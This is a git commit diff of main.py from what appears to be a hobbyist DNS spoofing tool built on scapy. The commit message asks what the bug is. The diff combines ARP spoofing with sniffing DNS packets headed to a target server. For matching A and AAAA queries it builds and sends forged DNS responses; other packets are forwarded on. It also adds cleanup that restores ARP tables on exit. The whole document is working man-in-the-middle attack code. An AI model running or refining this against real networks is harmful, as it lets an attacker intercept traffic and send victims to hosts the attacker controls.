02ed7fafb69673880a1611e35576eeadf6367dc9
Idan Maman <90776557+idanmaman2@users.noreply.github.com>
2022-12-25 23:14:01 +0200

    i have no qlue what is the bug ???

--- main.py
+++ main.py
@@ -1,8 +1,9 @@
 import arpSpoofing
 import sys
-from scapy.all import Ether , ARP,conf, get_if_addr , get_if_hwaddr,srp1,sendp,sniff , IP,DNS ,DNSRR, send
+from scapy.all import Ether , ARP,conf, get_if_addr , get_if_hwaddr,srp1,sendp,sniff , IP,DNS ,DNSRR, send,UDP 
 import subprocess, getopt
 import time
+import signal 
 import arpUtil
 import threading
 options = {
@@ -14,46 +15,56 @@ options = {
     "routerMac" : None,
     "mac ":None , #my mac
     "ip" : None , #my ip 
-
-
 } 
-
 def checkpacket(packet,name): 
-    try:
-        print(packet.ancount)
+    try: 
         for i in range(packet.ancount):
-            if (packet[DNSRR][i].type == 1 or packet[DNSRR][i].type == 28) and packet[DNSRR][i].rrname.decode(encoding="ascii")[:-1] == name:
-                yield  i 
-            else : 
-                print(packet[DNSRR][i].type )
-                print(packet[DNSRR][i].rrname.decode(encoding ="ascii"))
-    except: 
+            if (packet[DNSRR][i].type == 1 or packet[DNSRR][i].type == 28) and packet[DNSRR][i].rrname.decode(encoding="ascii") == (name + '.'):
+                return True,i 
+    except Exception as  e : 
         ...
+    return False , -1 
+
 
 def throworkill(packet,name,newaddr): 
-    print("entered")
-    for i in  checkpacket(packet, name)  :
-        print(i)
-        packet[DNSRR][i].rdata = newaddr 
-        print("*"*20)
-        packet[DNSRR][i].show()
-        print("\n"+"*"*20)
     packet[Ether].src = options["routerMac"]
     packet[Ether].dst = options["dnsmac"]
-    packet.show()
-    sendp(packet,iface=options["interface"]) # if it is not the final answear we just forwarding it to he dns server
+    pattern = newaddr.split('.')
+    mine , index  = checkpacket(packet, name) 
+    if mine : 
+        packet.show()
+        et = Ether(src =options["routerMac"] , dst =  options["dnsmac"] )
+        ip =  IP(src=packet[IP].src,dst=packet[IP].dst)
+        udp = UDP(dport=packet[UDP].sport,sport=packet[UDP].dport)
+        dnsdiff= DNS(id=packet[DNS].id,qd=packet[DNS].qd,
+                     aa=1,
+                     qr=1,#respone 
+                     tc = 0 , 
+                     rd = 0 , 
+                     ra= 0 , 
+                     z= 0 , 
+                     opcode =0 , 
+                     qdcount=1,
+                     ancount=1,
+                     nscount=0,
+                     arcount= 0 , 
 
+                     an=DNSRR(rrname=packet[DNS][index].qd.qname,type='A',ttl=3600,rdata='1.2.3.4'))
+        sendp( et/ip/udp/dnsdiff  ,iface=options["interface"],verbose=True)
+    else : 
+        sendp(packet,iface=options["interface"],verbose=False) 
+   
 
+def dispose(*args): 
+    print("dispoe")
+    arpUtil.changeArpTable(options["router"], options["routerMac"], options["dnsaddr"] , options["dnsmac"],options["interface"] )
+    sys.exit(0)
 def main()->None:
     '''
     usage: dnsSpoofing.py [-h] <dns ip> <domian name> <new ip> <interface>
     !!! - use sudo!
     optional arguments:
         -h, --help          show this help message and exit
-        -i IFACE, --iface IFACE
-                            Interface you wish to use
-        -t TARGET, --target TARGET
-                            IP of target dns server
     '''
     def redoit():
         while(True):
@@ -71,15 +82,16 @@ def main()->None:
     options["routerMac"] = arpUtil.getTargetMac(options["router"], options["interface"])
     options["mac"]=get_if_hwaddr(options["interface"])
     options["ip"]= get_if_addr(options["interface"])
-    
-    #arp spoofing
     tr = threading.Thread(target=redoit)
     tr.start()
-
-    #sniffing dns messages
     sniff(
         lfilter= lambda x : IP in x and x[IP].dst == options["dnsaddr"] , prn = lambda x : throworkill(x,options["name"],options["addr"]) )
+    
+    signal.signal(signal.SIGINT, dispose)
+    
+
     tr.join()
+    signal.pause()
 
 
 if __name__ == "__main__":
